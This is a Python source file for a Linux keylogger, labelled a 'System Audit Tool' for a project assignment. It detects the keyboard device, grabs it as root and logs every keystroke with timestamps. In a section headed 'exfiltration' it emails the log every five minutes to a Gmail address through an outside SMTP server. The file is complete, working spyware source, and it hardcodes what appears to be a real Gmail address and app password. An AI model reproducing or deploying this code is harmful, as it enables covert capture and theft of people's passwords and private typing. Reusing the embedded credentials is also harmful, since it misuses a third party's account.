#!/usr/bin/env python3
"""
Linux Keylogger - System Audit Tool
Project: Linux_Keylogger_Project_Assignment

A comprehensive keylogger for Linux systems with:
- Automatic keyboard device detection
- Real-time keystroke logging with timestamps
- Periodic email reports
- Graceful shutdown and signal handling
"""

import os
import sys
import time
import signal
import threading
import subprocess
import smtplib
import glob
import re
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Try to import evdev, install if not available
try:
    import evdev
except ImportError:
    print("[!] evdev module not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "evdev"])
    import evdev

# ================================================================
# CONFIGURATION SECTION
# ================================================================

LOG_FILE = "keystroke_audit.log"
EMAIL_INTERVAL = 300  # 5 minutes in seconds
EMAIL_RECIPIENT = "nilantaniloy9@gmail.com"  # CHANGE THIS
EMAIL_SENDER = "nilantaniloy9@gmail.com"     # CHANGE THIS
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_PASSWORD = "jfdi sklj kjcz rfdu"  # Use App Password for Gmail

# ================================================================
# PHASE 1: INPUT DEVICE IDENTIFICATION & PRIVILEGES
# ================================================================

class Keylogger:
    """Main Keylogger class handling device detection, capture, and email"""
    
    def __init__(self):
        self.device_path = None
        self.log_file = LOG_FILE
        self.running = True
        self.key_buffer = []
        self.shift_pressed = False
        self.caps_lock = False
        self.ctrl_pressed = False
        self.alt_pressed = False
        self.total_keys = 0
        
        # Complete key mapping from Linux evdev codes
        self.KEY_MAP = self._initialize_key_map()
        
    def _initialize_key_map(self):
        """Initialize complete key mapping dictionary"""
        return {
            # Letters
            'KEY_A': 'a', 'KEY_B': 'b', 'KEY_C': 'c', 'KEY_D': 'd',
            'KEY_E': 'e', 'KEY_F': 'f', 'KEY_G': 'g', 'KEY_H': 'h',
            'KEY_I': 'i', 'KEY_J': 'j', 'KEY_K': 'k', 'KEY_L': 'l',
            'KEY_M': 'm', 'KEY_N': 'n', 'KEY_O': 'o', 'KEY_P': 'p',
            'KEY_Q': 'q', 'KEY_R': 'r', 'KEY_S': 's', 'KEY_T': 't',
            'KEY_U': 'u', 'KEY_V': 'v', 'KEY_W': 'w', 'KEY_X': 'x',
            'KEY_Y': 'y', 'KEY_Z': 'z',
            
            # Numbers
            'KEY_1': '1', 'KEY_2': '2', 'KEY_3': '3', 'KEY_4': '4',
            'KEY_5': '5', 'KEY_6': '6', 'KEY_7': '7', 'KEY_8': '8',
            'KEY_9': '9', 'KEY_0': '0',
            
            # Special characters
            'KEY_MINUS': '-', 'KEY_EQUAL': '=', 'KEY_LEFTBRACE': '[',
            'KEY_RIGHTBRACE': ']', 'KEY_BACKSLASH': '\\', 'KEY_SEMICOLON': ';',
            'KEY_APOSTROPHE': "'", 'KEY_GRAVE': '`', 'KEY_COMMA': ',',
            'KEY_DOT': '.', 'KEY_SLASH': '/', 'KEY_SPACE': ' ',
            
            # Special keys
            'KEY_ENTER': '\n', 'KEY_BACKSPACE': '[BACKSPACE]',
            'KEY_TAB': '[TAB]', 'KEY_ESC': '[ESC]',
            'KEY_UP': '[UP]', 'KEY_DOWN': '[DOWN]',
            'KEY_LEFT': '[LEFT]', 'KEY_RIGHT': '[RIGHT]',
            'KEY_HOME': '[HOME]', 'KEY_END': '[END]',
            'KEY_PAGEUP': '[PAGEUP]', 'KEY_PAGEDOWN': '[PAGEDOWN]',
            'KEY_INSERT': '[INSERT]', 'KEY_DELETE': '[DELETE]',
            'KEY_CAPSLOCK': '[CAPSLOCK]', 'KEY_NUMLOCK': '[NUMLOCK]',
            'KEY_SCROLLLOCK': '[SCROLLLOCK]', 'KEY_PAUSE': '[PAUSE]',
            'KEY_PRINT': '[PRINT]', 'KEY_SYSRQ': '[SYSRQ]',
            
            # Function keys
            'KEY_F1': '[F1]', 'KEY_F2': '[F2]', 'KEY_F3': '[F3]',
            'KEY_F4': '[F4]', 'KEY_F5': '[F5]', 'KEY_F6': '[F6]',
            'KEY_F7': '[F7]', 'KEY_F8': '[F8]', 'KEY_F9': '[F9]',
            'KEY_F10': '[F10]', 'KEY_F11': '[F11]', 'KEY_F12': '[F12]',
            
            # Numpad keys
            'KEY_KP0': '0', 'KEY_KP1': '1', 'KEY_KP2': '2',
            'KEY_KP3': '3', 'KEY_KP4': '4', 'KEY_KP5': '5',
            'KEY_KP6': '6', 'KEY_KP7': '7', 'KEY_KP8': '8',
            'KEY_KP9': '9', 'KEY_KPDOT': '.', 'KEY_KPENTER': '\n',
            'KEY_KPPLUS': '+', 'KEY_KPMINUS': '-', 'KEY_KPASTERISK': '*',
            'KEY_KPSLASH': '/', 'KEY_KPEQUAL': '=',
            
            # Modifier keys (filtered out)
            'KEY_LEFTSHIFT': None, 'KEY_RIGHTSHIFT': None,
            'KEY_LEFTCTRL': None, 'KEY_RIGHTCTRL': None,
            'KEY_LEFTALT': None, 'KEY_RIGHTALT': None,
            'KEY_LEFTMETA': None, 'KEY_RIGHTMETA': None,
        }
    
    def check_privileges(self):
        """Phase 1: Check if running with root privileges"""
        print("\n[Phase 1] Checking privileges...")
        if os.geteuid() != 0:
            print("✗ ERROR: This script requires root privileges to read input devices.")
            print("  Please run with: sudo python3 keylogger.py")
            sys.exit(1)
        print("✓ Privilege verification passed: Running as root (UID: {})".format(os.geteuid()))
        return True
    
    def detect_keyboard_device(self):
        """Phase 1: Automatically detect keyboard input device"""
        print("\n[Phase 1] Detecting keyboard input device...")
        
        # Method 1: Use evdev to list devices
        try:
            devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
            for device in devices:
                device_name = device.name.lower()
                if 'keyboard' in device_name or 'key' in device_name:
                    if 'mouse' not in device_name and 'touch' not in device_name:
                        print("✓ Keyboard device found: {} ({})".format(device.path, device.name))
                        return device.path
        except Exception as e:
            print("  [!] evdev detection error: {}".format(e))
        
        # Method 2: Parse /proc/bus/input/devices
        try:
            with open('/proc/bus/input/devices', 'r') as f:
                content = f.read()
                devices = re.findall(r'N: Name="([^"]+)"\s+H: Handlers=([^\n]+)', content, re.MULTILINE)
                for name, handlers in devices:
                    if 'keyboard' in name.lower() or 'key' in name.lower():
                        if 'mouse' not in name.lower():
                            event_match = re.search(r'event(\d+)', handlers)
                            if event_match:
                                event_num = event_match.group(1)
                                device_path = f"/dev/input/event{event_num}"
                                print("✓ Keyboard device found: {} ({})".format(device_path, name))
                                return device_path
        except Exception as e:
            print("  [!] /proc parsing error: {}".format(e))
        
        # Method 3: Check /dev/input/by-id/
        try:
            id_patterns = [
                '/dev/input/by-id/*-event-kbd',
                '/dev/input/by-id/usb-*-event-kbd',
                '/dev/input/by-path/*-kbd'
            ]
            for pattern in id_patterns:
                matches = glob.glob(pattern)
                if matches:
                    device_path = matches[0]
                    print("✓ Keyboard device found: {}".format(device_path))
                    return device_path
        except Exception as e:
            print("  [!] by-id detection error: {}".format(e))
        
        # Method 4: Try common keyboard paths
        common_paths = [
            '/dev/input/event2',  # Common for internal keyboard
            '/dev/input/event3',  # Common for external keyboard
            '/dev/input/event1',  # Alternative
            '/dev/input/event0',  # Alternative
        ]
        for path in common_paths:
            if os.path.exists(path):
                try:
                    device = evdev.InputDevice(path)
                    if 'keyboard' in device.name.lower() or 'key' in device.name.lower():
                        print("✓ Keyboard device found: {} ({})".format(path, device.name))
                        return path
                except:
                    pass
        
        # If no device found, ask user for manual input
        print("\n[!] Could not automatically detect keyboard device.")
        print("  Available input devices:")
        try:
            for path in evdev.list_devices():
                device = evdev.InputDevice(path)
                print("    - {}: {}".format(path, device.name))
        except:
            pass
        
        print("\n  Please enter the device path manually")
        print("  Examples: /dev/input/event2, /dev/input/by-id/usb-keyboard")
        while True:
            device_path = input("  Device path: ").strip()
            if os.path.exists(device_path):
                print("✓ Using manual device: {}".format(device_path))
                return device_path
            else:
                print("✗ Invalid device path. Please try again.")
    
    # ================================================================
    # PHASE 2: REAL-TIME EVENT CAPTURE & LOGGING
    # ================================================================
    
    def process_key_event(self, key_event):
        """Process a single key event and return the character to log"""
        key_code = key_event.keycode
        
        # Track modifier keys state
        if key_code == 'KEY_LEFTSHIFT' or key_code == 'KEY_RIGHTSHIFT':
            self.shift_pressed = (key_event.keystate == 1)
            return None
        elif key_code == 'KEY_CAPSLOCK':
            if key_event.keystate == 1:  # Toggle on press
                self.caps_lock = not self.caps_lock
            return None
        elif key_code == 'KEY_LEFTCTRL' or key_code == 'KEY_RIGHTCTRL':
            self.ctrl_pressed = (key_event.keystate == 1)
            return None
        elif key_code == 'KEY_LEFTALT' or key_code == 'KEY_RIGHTALT':
            self.alt_pressed = (key_event.keystate == 1)
            return None
        
        # Only log key press events (state = 1)
        if key_event.keystate != 1:
            return None
        
        # Get mapped character
        char = self.KEY_MAP.get(key_code)
        
        # Skip modifier keys (those mapped to None)
        if char is None:
            return None
        
        # Handle shift and caps lock for letters
        if len(key_code) > 4 and key_code.startswith('KEY_'):
            letter = key_code[4:]  # Remove 'KEY_' prefix
            if len(letter) == 1 and letter.isalpha():
                if self.shift_pressed or self.caps_lock:
                    char = char.upper()
        
        # Handle special characters with shift
        if self.shift_pressed:
            shift_map = {
                '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
                '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
                '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
                ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
                '`': '~'
            }
            if char in shift_map:
                char = shift_map[char]
        
        self.total_keys += 1
        return char
    
    def capture_keystrokes(self):
        """Phase 2: Capture and log keystrokes in real-time"""
        print("\n[Phase 2] Starting real-time keystroke capture...")
        
        try:
            device = evdev.InputDevice(self.device_path)
            device.grab()  # Grab device exclusively
            
            print("✓ Listening to: {}".format(device.name))
            print("\n" + "=" * 60)
            print("  KEYSTROKE LOGGER ACTIVE")
            print("  Log file: {}".format(self.log_file))
            print("  Email interval: {} minutes".format(EMAIL_INTERVAL // 60))
            print("  Press Ctrl+C to stop")
            print("=" * 60 + "\n")
            
            # Initialize log file with header if it doesn't exist
            if not os.path.exists(self.log_file) or os.path.getsize(self.log_file) == 0:
                with open(self.log_file, 'w') as f:
                    f.write("=" * 60 + "\n")
                    f.write("KEYSTROKE AUDIT LOG\n")
                    f.write("Started: {}\n".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
                    f.write("Device: {} ({})\n".format(self.device_path, device.name))
                    f.write("=" * 60 + "\n\n")
            
            for event in device.read_loop():
                if not self.running:
                    break
                
                if event.type == evdev.ecodes.EV_KEY:
                    key_event = evdev.categorize(event)
                    char = self.process_key_event(key_event)
                    
                    if char is not None:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
                        
                        # Write to log file
                        with open(self.log_file, 'a') as f:
                            log_entry = "[{}] {}\n".format(timestamp, char)
                            f.write(log_entry)
                            f.flush()
                        
                        # Display on console (with formatting)
                        if char == '\n':
                            display_char = '[ENTER]'
                        elif char == ' ':
                            display_char = '[SPACE]'
                        else:
                            display_char = char
                        
                        print("[{}] {}".format(timestamp, display_char))
                        
                        # Add to buffer for email
                        self.key_buffer.append(char)
        
        except PermissionError:
            print("\n✗ Permission denied. Make sure you're running with sudo.")
            sys.exit(1)
        except FileNotFoundError:
            print("\n✗ Device {} not found.".format(self.device_path))
            sys.exit(1)
        except Exception as e:
            print("\n✗ Error during capture: {}".format(e))
            sys.exit(1)
        finally:
            if 'device' in locals():
                device.ungrab()
    
    # ================================================================
    # PHASE 3: AUTOMATED EMAIL EXFILTRATION
    # ================================================================
    
    def send_email(self):
        """Phase 3: Send email with log file"""
        print("\n[Phase 3] Sending email report...")
        
        try:
            # Read log file content
            if not os.path.exists(self.log_file):
                print("✗ Log file not found.")
                return False
            
            with open(self.log_file, 'r') as f:
                log_content = f.read()
            
            if len(log_content.strip()) <= 100:  # Only header
                print("✗ No keystrokes logged since last email.")
                return False
            
            # Create email message
            msg = MIMEMultipart()
            msg['From'] = EMAIL_SENDER
            msg['To'] = EMAIL_RECIPIENT
            msg['Subject'] = "Keystroke Audit Log - {}".format(
                datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            )
            
            # Email body
            body = """
            KEYSTROKE AUDIT REPORT
            ======================
            Generated: {}
            Log File: {}
            Total Keys Logged: {}
            Device: {}
            
            Log Content:
            ------------
            {}
            """.format(
                datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                self.log_file,
                self.total_keys,
                self.device_path,
                log_content
            )
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach log file
            with open(self.log_file, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    'attachment; filename="{}"'.format(self.log_file)
                )
                msg.attach(part)
            
            # Send email
            if SMTP_PASSWORD and SMTP_PASSWORD != "your_app_password":
                # Use SMTP with authentication
                print("  Connecting to SMTP server {}:{}...".format(SMTP_SERVER, SMTP_PORT))
                server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
                server.starttls()
                server.login(EMAIL_SENDER, SMTP_PASSWORD)
                server.send_message(msg)
                server.quit()
                print("✓ Email sent successfully via SMTP")
                return True
            else:
                # Fallback to system mail command
                print("  Using system mail command...")
                try:
                    subprocess.run(
                        ['mail', '-s', msg['Subject'], EMAIL_RECIPIENT],
                        input=log_content,
                        text=True,
                        check=True
                    )
                    print("✓ Email sent via system mail command")
                    return True
                except Exception as e:
                    print("✗ System mail failed: {}".format(e))
                    return False
        
        except Exception as e:
            print("✗ Error sending email: {}".format(e))
            return False
    
    def email_timer_loop(self):
        """Background timer for periodic email sending"""
        print("\n[Phase 3] Starting email timer (every {} minutes)".format(EMAIL_INTERVAL // 60))
        
        while self.running:
            time.sleep(EMAIL_INTERVAL)
            if self.running:
                success = self.send_email()
                if success:
                    # Clear the log file after successful send (keep header)
                    with open(self.log_file, 'r') as f:
                        lines = f.readlines()
                    
                    # Keep only the header (first 5 lines)
                    with open(self.log_file, 'w') as f:
                        f.writelines(lines[:5])
                        f.write("\n")
    
    # ================================================================
    # MAIN EXECUTION
    # ================================================================
    
    def run(self):
        """Main execution method"""
        print("=" * 60)
        print("  LINUX KEYLOGGER - System Audit Tool")
        print("  Project: Linux_Keylogger_Project_Assignment")
        print("=" * 60)
        
        # Phase 1: Check privileges
        self.check_privileges()
        
        # Phase 1: Detect keyboard device
        self.device_path = self.detect_keyboard_device()
        
        # Phase 3: Start email timer thread
        email_thread = threading.Thread(target=self.email_timer_loop, daemon=True)
        email_thread.start()
        
        # Phase 2: Start capturing keystrokes
        try:
            self.capture_keystrokes()
        except KeyboardInterrupt:
            print("\n\n[*] Stopping keylogger...")
            self.running = False
            sys.exit(0)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print("\n\n[*] Shutting down keylogger...")
        self.running = False
        sys.exit(0)

# ================================================================
# ENTRY POINT
# ================================================================

if __name__ == "__main__":
    keylogger = Keylogger()
    
    # Register signal handlers
    signal.signal(signal.SIGINT, keylogger.signal_handler)
    signal.signal(signal.SIGTERM, keylogger.signal_handler)
    
    # Run the keylogger
    keylogger.run()
